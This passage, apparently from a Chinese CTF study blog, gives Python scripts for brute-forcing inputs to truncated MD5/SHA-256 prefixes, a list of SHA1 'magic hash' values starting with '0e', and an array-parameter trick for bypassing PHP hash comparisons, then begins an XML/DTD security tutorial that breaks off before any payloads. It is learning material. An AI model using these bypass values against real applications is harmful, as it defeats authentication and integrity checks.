class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><br>keymd5 = <span class="hljs-string">&#x27;8ffb1&#x27;</span>   <span class="hljs-comment">#已知的md5截断值</span><br>md5start = <span class="hljs-number">0</span>   <span class="hljs-comment"># 设置题目已知的截断位置</span><br>md5length = <span class="hljs-number">5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findmd5</span>(<span class="hljs-params">sss</span>):    <span class="hljs-comment"># 输入范围 里面会进行md5测试</span><br>    key = sss.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    start = <span class="hljs-built_in">int</span>(key[<span class="hljs-number">0</span>])   <span class="hljs-comment"># 开始位置</span><br>    end = <span class="hljs-built_in">int</span>(key[<span class="hljs-number">1</span>])    <span class="hljs-comment"># 结束位置</span><br>    result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end):<br>        <span class="hljs-comment"># print(md5(i)[md5start:md5length])</span><br>        <span class="hljs-keyword">if</span> md5(i)[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] == keymd5:            <span class="hljs-comment"># 拿到加密字符串</span><br>            result = i<br>            <span class="hljs-built_in">print</span>(result)    <span class="hljs-comment"># 打印</span><br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-built_in">list</span>=[]  <span class="hljs-comment"># 参数列表</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):   <span class="hljs-comment"># 多线程的数字列表 开始与结尾</span><br>    <span class="hljs-built_in">list</span>.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">10000000</span>*i) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">10000000</span>*(i+<span class="hljs-number">1</span>)))<br>pool = ThreadPool()    <span class="hljs-comment"># 多线程任务</span><br>pool.<span class="hljs-built_in">map</span>(findmd5, <span class="hljs-built_in">list</span>) <span class="hljs-comment"># 函数 与参数列表</span><br>pool.close()<br>pool.join()<br><br></code></pre></td></tr></table></figure><h1 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h1><h2 id="常规碰撞"><a href="#常规碰撞" class="headerlink" title="常规碰撞"></a>常规碰撞</h2><p>与MD5大差不差</p><p><strong>以下值在sha1加密后以0E开头：</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">aaroZmOk<br>aaK1STfY<br>aaO8zKZF<br>aa3OFF9m<br><span class="hljs-number">0</span>e<span class="hljs-number">1290633704</span><br><span class="hljs-number">10932435112</span><br></code></pre></td></tr></table></figure><p>如果是强比较，没有转为string，可以用数组 例如 a[]&#x3D;1&amp;b[]&#x3D;2来绕过，也可以用强碰撞；</p><p>如果是强比较，但转为string，用强碰撞</p><h2 id="截断爆破"><a href="#截断爆破" class="headerlink" title="截断爆破"></a>截断爆破</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool <span class="hljs-keyword">as</span> ThreadPool<br><br><span class="hljs-comment"># sha256截断数值已知 求原始数据</span><br><span class="hljs-comment"># 例子 substr(sha256(captcha), 0, 6)=60b7ef</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sha256</span>(<span class="hljs-params">s</span>):  <span class="hljs-comment"># 计算sha256字符串</span><br>    <span class="hljs-keyword">return</span> hashlib.sha256((<span class="hljs-string">&#x27;TQLCTF&#x27;</span>+<span class="hljs-built_in">str</span>(s)).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><br>keysha256 = <span class="hljs-string">&#x27;5625f&#x27;</span>   <span class="hljs-comment">#已知的sha256截断值</span><br>sha256start = <span class="hljs-number">0</span>   <span class="hljs-comment"># 设置题目已知的截断位置</span><br>sha256length = <span class="hljs-number">5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findsha256</span>(<span class="hljs-params">sss</span>):    <span class="hljs-comment"># 输入范围 里面会进行sha256测试</span><br>    key = sss.split(<span class="hljs-string">&#x27;:&#x27;</span>)<br>    start = <span class="hljs-built_in">int</span>(key[<span class="hljs-number">0</span>])   <span class="hljs-comment"># 开始位置</span><br>    end = <span class="hljs-built_in">int</span>(key[<span class="hljs-number">1</span>])    <span class="hljs-comment"># 结束位置</span><br>    result = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start, end):<br>        <span class="hljs-comment"># print(sha256(i)[sha256start:sha256length])</span><br>        <span class="hljs-keyword">if</span> sha256(i)[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] == keysha256:            <span class="hljs-comment"># 拿到加密字符串</span><br>            result = i<br>            <span class="hljs-built_in">print</span>(result)    <span class="hljs-comment"># 打印</span><br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-built_in">list</span>=[]  <span class="hljs-comment"># 参数列表</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):   <span class="hljs-comment"># 多线程的数字列表 开始与结尾</span><br>    <span class="hljs-built_in">list</span>.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">10000000</span>*i) + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">10000000</span>*(i+<span class="hljs-number">1</span>)))<br>pool = ThreadPool()    <span class="hljs-comment"># 多线程任务</span><br>pool.<span class="hljs-built_in">map</span>(findsha256, <span class="hljs-built_in">list</span>) <span class="hljs-comment"># 函数 与参数列表</span><br>pool.close()<br>pool.join()<br><br></code></pre></td></tr></table></figure><p>至于其他的碰撞，如SHA-224、SHA-256等，我们可以查找一个hash碰撞收集库：<a href="https://github.com/spaze/hashes">https://github.com/spaze/hashes</a></p><p>这里就不再详解</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XML相关安全问题</title>
    <link href="/2025/07/13/XML%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2025/07/13/XML%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h1><h2 id="XML相关"><a href="#XML相关" class="headerlink" title="XML相关"></a>XML相关</h2><h3 id="XML的来源"><a href="#XML的来源" class="headerlink" title="XML的来源"></a><strong>XML的来源</strong></h3><p>XML有两个先驱——SGML（标准通用标记语言）和HTML（超文本标记语言），这两个语言都是非常成功的标记语言。SGML多用于科技文献和政府办公文件中，SGML非常复杂，其复杂程度对于网络上的日常使用简直不可思议。HTML免费、简单，已经获得了广泛的支持，方便大众的使用。而XML（可扩展标记语言）它既具有SGML的强大功能和可扩展性，同时又具有HTML的简单性。</p><p>但是XML与HTML有很多不同，其主要差异为：</p><p>XML 被设计为<strong>传输和存储数据</strong>，其焦点是数据的内容；</p><p>HTML 被设计用来<strong>显示数据</strong>，其焦点是数据的外观。</p><p>即HTML 旨在显示信息 ，而 XML 旨在传输信息。</p><h3 id="什么是-XML？"><a href="#什么是-XML？" class="headerlink" title="什么是 XML？"></a><strong>什么是 XML？</strong></h3><p>XML 指可扩展标记语言（EXtensible Markup Language）。</p><p>XML 的设计宗旨是传输数据，而不是显示数据。</p><p>XML 是 W3C 的推荐标准。</p><p>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p><p>XML 语言没有预定义的标签。</p><h3 id="什么是XSL？"><a href="#什么是XSL？" class="headerlink" title="什么是XSL？"></a>什么是XSL？</h3><p>XSL 指扩展样式表语言（EXtensible Stylesheet Language），XML本身就是一个XML文档，它是通过XML进行定义的，遵守XML的语法规则，是XML的一种具体应用。</p><p>如果说HTML的样式表是CSS，那么XML的样式表就是XSL。但XSL比CSS更强大。XSL - 不仅仅是样式表语言。</p><p>XSL 包括以下三部分，</p><ul><li><p>XSLT：一种用于转换 XML 文档的语言。</p></li><li><p>XPath：一种用于在 XML 文档中导航的语言。</p></li><li><p>XSL-FO：一种用于格式化 XML 文档的语言。</p></li></ul><h2 id="XML基本语法"><a href="#XML基本语法" class="headerlink" title="XML基本语法"></a>XML基本语法</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;</span>                      <span class="hljs-comment">&lt;!--xml文件的声明--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">bookstore</span>&gt;</span>                                                                         <span class="hljs-comment">&lt;!--根元素--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">book</span> <span class="hljs-attr">category</span>=<span class="hljs-string">&quot;COOKING&quot;</span>&gt;</span>                                   <span class="hljs-comment">&lt;!--bookstore的子元素，category为属性--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>Everyday Italian<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>                    <span class="hljs-comment">&lt;!--book的子元素，lang为属性--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span>Giada De Laurentiis<span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>                                   <span class="hljs-comment">&lt;!--book的子元素--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">year</span>&gt;</span>2005<span class="hljs-tag">&lt;/<span class="hljs-name">year</span>&gt;</span>                                                      <span class="hljs-comment">&lt;!--book的子元素--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>30.00<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span>                                                   <span class="hljs-comment">&lt;!--book的子元素--&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span>                                                                      <span class="hljs-comment">&lt;!--book的结束--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">bookstore</span>&gt;</span>                                                                <span class="hljs-comment">&lt;!--bookstore的结束--&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> 称为 XML prolog ，用于声明XML文档的版本和编码，是可选的，必须放在文档开头，standalone值是yes的时候表示DTD仅用于验证文档结构，从而外部实体将被禁用，但它的默认值是no，而且有些parser会直接忽略这一项。</p><p>基本语法：</p><blockquote><p>XML prolog 用于声明XML文档的版本和编码，是可选的，必须放在文档开头。</p><p>XML 文档必须有根元素。</p><p>XML 必须正确地嵌套：在一个XML元素中允许包含其他XML元素，但这些元素之间必须满足嵌套性。</p><p>XML 标签对大小写敏感：在标记中必须注意区分大小写，在XML中，<code>&lt;TEST&gt;</code>和<code>&lt;test&gt;</code>是两个截然不同的标记。</p><p>所有 XML 元素都须有关闭标签：结束标记除了要和开始编辑在拼写和大小上完全相同，还必须在前面加上一个斜杠“&#x2F;”，若开始标记<code>&lt;test&gt;</code>，结束标记则为<code>&lt;/test&gt;</code>。XML严格要求标记配对，像HTML中的<code>&lt;br&gt;</code>、<code>&lt;hr&gt;</code>的元素形式在XML中是不合法的。当一对标记之间没有任何文本内容时，可以不写结束标记，在开始标记的末尾加上斜杠”&#x2F;”来确认，例如：<code>&lt;test /&gt;</code> 这样的标记被称为“空标记”。</p><p>XML 有效使用属性（属性值须加引号）：标记中可以包含任意多个属性。在标记中，属性以名称&#x2F;取值对出现，属性名不能重复，名称与取值之间用等号“&#x3D;”分隔，且取值用引号引起来。举个例子：<code>&lt;衣服 品牌=“耐克” 类型=“T恤” &gt;</code></p><p>若多个字符都需要转义，则可以将这些内容存放到CDATA里面，<code>&lt;![CDATA[ 内容 ]]&gt;</code></p></blockquote><p>或许有人会问，上面的bookstore、book啥的我们都没定义，可以直接用吗？</p><p>其实，如果没有使用 DTD 或 XML Schema，XML 是 <strong>自由结构</strong> 的。也就是说，你可以直接使用 <code>&lt;bookstore&gt;</code> 和 <code>&lt;author&gt;</code> 等元素，而不需要显式定义它们。</p><p>在这种情况下，XML 仅需要符合基本的语法规则，比如标签正确嵌套、属性正确书写等。</p><p>但是，我们本节必须要引入DTD的概念，因为实际利用中我们还是需要对元素进行声明的。</p><h3 id="DTD概念"><a href="#DTD概念" class="headerlink" title="DTD概念"></a><strong>DTD概念</strong></h3><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。</p><p>DTD用来为XML文档定义语义约束。是XML文档中的几条语句，用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><p>可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。</p><h3 id="DTD的引入方式"><a href="#DTD的引入方式" class="headerlink" title="DTD的引入方式"></a><strong>DTD的引入方式</strong></h3><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内部声明，也可以文档外部引用。</p><p>当然，这里的内部声明与外部引用是以XML 文档为界限（从定义也可以看出），在xml文档内部声明的就是内部实体，引用xml外面的文档就是外部实体（文档外面可以是本地的其他文档，也可以是互联网中的XML 文档）。</p><p><em><strong>内部 DTD</strong></em></p><p>使用内部的dtd文件，即将约束规则定义在xml文档中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素名称 [元素声明]&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;</span>                 <span class="hljs-comment">&lt;!-- XML文件声明 --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> [                                                        &lt;!-- 定义此文档是 note 类型的文档 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">note</span> (<span class="hljs-keyword">to</span>, <span class="hljs-keyword">from</span>, <span class="hljs-keyword">heading</span>, <span class="hljs-keyword">body</span>)&gt;</span>                            &lt;!-- 定义note元素包含的四个子元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>                                              &lt;!-- 定义to元素为“#PCDATA”类型 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>                                            &lt;!-- 定义from元素为“#PCDATA”类型 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">heading</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>                                        &lt;!-- 定义heading元素为“#PCDATA”类型 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span>                                           &lt;!-- 定义body元素为“#PCDATA”类型 --&gt;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span>                                                                   <span class="hljs-comment">&lt;!-- 根元素 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span>                                                         <span class="hljs-comment">&lt;!-- note的子元素 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>                                                     <span class="hljs-comment">&lt;!-- note的子元素 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span>                                              <span class="hljs-comment">&lt;!-- note的子元素 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>                                                   <span class="hljs-comment">&lt;!-- note的子元素 --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span>                                                                  <span class="hljs-comment">&lt;!-- note的结束 --&gt;</span><br></code></pre></td></tr></table></figure><p><em><strong>外部 DTD</strong></em></p><p>（1）引入外部的dtd文件（本地的）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素名称 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;DTD文档的路径&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>（2）引入外部的dtd文件（网络上）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素名称 <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;DTD名称&quot;</span> <span class="hljs-string">&quot;DTD文档的URL&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;test.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上面引用的test.dtd的内容如下，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">to</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">from</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">head</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">body</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br></code></pre></td></tr></table></figure><h3 id="DTD的定义方式"><a href="#DTD的定义方式" class="headerlink" title="DTD的定义方式"></a>DTD的定义方式</h3><p>实际上这个标题不够好，我们这里讲的是</p><blockquote><p>DTD定义 XML 文档结构和内容的关键机制</p></blockquote><p>在 DTD（文档类型定义）中，用于定义 XML 文档结构和内容的关键机制主要包括以下几种，</p><p><strong>元素声明</strong>：</p><p>用于定义 XML 文档中的元素及其内容模型。</p><p>语法：<code>&lt;!ELEMENT element-name (content-model)&gt;</code></p><p><strong>属性声明</strong>：</p><p>用于定义元素可能具有的属性及其类型。</p><p>语法：<code>&lt;!ATTLIST element-name attribute-name attribute-type default-declaration&gt;</code></p><p><strong>实体声明</strong>：</p><p>用于定义可重用的文本或外部资源。</p><p>语法：内部实体为<code>&lt;!ENTITY entity-name &quot;value&quot;&gt;</code>，外部实体为<code>&lt;!ENTITY entity-name SYSTEM &quot;URI&quot;&gt;</code></p><p><strong>符号（Notation）声明</strong>：</p><p>用于定义非 XML 数据的格式。</p><p>语法：<code>&lt;!NOTATION name PUBLIC &quot;public-identifier&quot; SYSTEM &quot;URI&quot;&gt;</code></p><p>示例，<code>&lt;!NOTATION gif PUBLIC &quot;image/gif&quot;&gt;</code></p><p><strong>注释</strong>：</p><p>在 DTD 中可以添加注释，便于说明文档结构。</p><p>格式：<code>&lt;!-- This is a comment --&gt;</code></p><p>注意，</p><p>关键是要区分下面几种<strong>DTD 声明关键词</strong>，</p><blockquote><p><strong>ELEMENT</strong>：用来定义 XML 文档的结构，例如定义根元素包含哪些子元素。</p><p><strong>ATTLIST</strong>：用来定义元素的属性，例如在 <code>&lt;book&gt;</code> 元素中定义 <code>category</code> 属性。（注意区别元素的类别与元素的属性）</p><p><strong>ENTITY</strong>：用来定义固定的文本片段或引用外部文件，例如书籍作者名称或外部 XML 文件。</p><p><strong>Notation</strong>：用于定义非 XML 数据的格式，如图片、视频等</p></blockquote><h2 id="DTD详解"><a href="#DTD详解" class="headerlink" title="DTD详解"></a>DTD详解</h2><p>我们这里详细解析一下DTD元素、属性以及实体，尤其是实体，是重中之重。</p><h3 id="DTD元素"><a href="#DTD元素" class="headerlink" title="DTD元素"></a><strong>DTD元素</strong></h3><p>元素声明语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT 元素名称 内容模型&gt;</span><br></code></pre></td></tr></table></figure><p>其中元素名称是我们自己编的，这里讲一下内容模型。</p><p>内容模型(content-model)可以是以下之一，</p><ul><li><code>EMPTY</code>：表示元素是空元素</li><li><code>ANY</code>：表示元素可以包含任何内容</li><li><code>#PCDATA</code>：表示元素包含文本数据。</li><li><code>(child1, child2, ...)</code>：表示元素包含其他子元素，且子元素的顺序必须匹配。</li><li><code>*</code>、<code>+</code>、<code>?</code>：表示重复规则，分别为 0 次或多次、1 次或多次、0 次或 1 次。</li><li><code>|</code>：表示选择规则，即多个子元素中的任意一个。</li></ul><p>示例，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">book</span> (<span class="hljs-keyword">title</span>, <span class="hljs-keyword">author</span>, <span class="hljs-keyword">publisher</span>)&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">title</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>注意，</p><p>PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。被解析的字符数据不应当包含任何<code>&amp;</code>，<code>&lt;</code>，或者<code>&gt;</code>字符，需要用<code>&amp;</code> <code>&lt;</code> <code>&gt;</code>实体来分别替换。</p><p>CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p><p>我们这里对比下元素与实体的声明方法，</p><table><thead><tr><th>类型</th><th>DTD ENTITY 声明格式</th><th>DTD ELEMENT 声明格式</th></tr></thead><tbody><tr><td>声明一个元素</td><td><code>&lt;!ENTITY 元素名称 类别&gt;</code></td><td><code>&lt;!ELEMENT 元素名称 元素内容&gt;</code></td></tr><tr><td>空元素</td><td><code>&lt;!ENTITY 元素名称 EMPTY&gt;</code></td><td><code>&lt;!ELEMENT 元素名称 EMPTY&gt; </code></td></tr><tr><td>只有 PCDATA 的元素</td><td><code>&lt;!ENTITY 元素名称 (#PCDATA)&gt;</code></td><td><code>&lt;!ELEMENT 元素名称 (#PCDATA)&gt;</code></td></tr><tr><td>带有任何内容的元素</td><td><code>&lt;!ENTITY 元素名称 ANY&gt;</code></td><td><code>&lt;!ELEMENT 元素名称 ANY&gt;</code></td></tr><tr><td>带有子元素（序列）的元素</td><td><code>&lt;!ENTITY 元素名称 (子元素名称1, 子元素名称2, …………)&gt;</code></td><td><code>&lt;!ELEMENT 元素名称 (子元素名称1, 子元素名称2, …………)&gt;</code></td></tr></tbody></table><h3 id="DTD属性"><a href="#DTD属性" class="headerlink" title="DTD属性"></a><strong>DTD属性</strong></h3><p>属性声明语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认属性值&gt;</span><br></code></pre></td></tr></table></figure><p>其中，元素名称即属性名称是我们自己编的，这里我们提一下属性类型及默认属性值。</p><p>属性类型的选项：</p><table><thead><tr><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>CDATA</td><td>值为字符串数据 (character data)</td></tr><tr><td>&#96;(value1</td><td>value2</td></tr><tr><td>ID</td><td>值为唯一的 id</td></tr><tr><td>IDREF</td><td>值为另一个元素的 id</td></tr><tr><td>IDREFS</td><td>值为其他 id 的列表</td></tr><tr><td>NMTOKEN</td><td>值为合法的 XML 名称</td></tr><tr><td>NMTOKENS</td><td>值为合法的 XML 名称的列表</td></tr><tr><td>ENTITY</td><td>值是一个实体</td></tr><tr><td>ENTITIES</td><td>值是一个实体列表</td></tr><tr><td>NOTATION</td><td>此值是符号的名称</td></tr><tr><td>xml:</td><td>值是一个预定义的 XML 值</td></tr></tbody></table><p>默认属性值可使用下列值（也可以直接指定）：</p><table><thead><tr><th>默认值</th><th>解释</th></tr></thead><tbody><tr><td>#REQUIRED</td><td>属性值是必需的</td></tr><tr><td>#IMPLIED</td><td>属性值不是必需的</td></tr><tr><td>#FIXED value</td><td>属性值是固定的</td></tr></tbody></table><p>示例，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-keyword">book</span> <span class="hljs-keyword">isbn</span> <span class="hljs-keyword">CDATA</span> <span class="hljs-keyword">#REQUIRED</span>&gt;</span><br><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-keyword">book</span> <span class="hljs-keyword">category</span> (<span class="hljs-keyword">fiction</span>|<span class="hljs-keyword">non-fiction</span>) <span class="hljs-string">&quot;fiction&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="DTD实体"><a href="#DTD实体" class="headerlink" 